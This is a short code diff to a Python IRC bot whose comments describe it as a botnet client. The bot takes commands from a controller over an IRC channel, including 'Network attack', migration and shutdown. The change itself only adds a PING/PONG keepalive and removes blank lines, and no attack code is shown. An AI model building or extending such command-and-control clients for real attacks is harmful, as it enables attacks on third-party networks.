@@ -17,6 +17,7 @@ IRCSOCKET = None
 # Execute commands sent by controller to channel
 # Commands: Network attack, migration to different IRC, ShutDown
 # Report status of command execution to controller
+# IMPLEMENT PINGPONG: https://linuxacademy.com/blog/geek/creating-an-irc-bot-with-python3/
 
 # CONTROLLER INFO
 conNick = None 
@@ -35,6 +36,10 @@ def joinIRC(IRCSOCKET, CHANNEL):
     sendMsg(IRCSOCKET, "NICK " + botNick + "\n")
     sendMsg(IRCSOCKET, "JOIN " + CHANNEL + "\n")
 
+# FOR PINGPONG
+def ping():
+    # https://linuxacademy.com/blog/geek/creating-an-irc-bot-with-python3/
+    IRCSOCKET.send(bytes("PONG :pingis\n", "UTF-8"))
 
 # THESE ARE THE FUNCTIONS FOR THE COMMANDS
 def getStatus():    
@@ -76,8 +81,6 @@ def sendPrivate(conNick, msg):
 def sendMsg(sock, msg):
     msg = msg.encode('utf-8', 'ignore')
     sock.send(msg)
-
-
 
 
 # GET COMMANDS FROM CONTROLLER AKA READ IRC MESSAGES
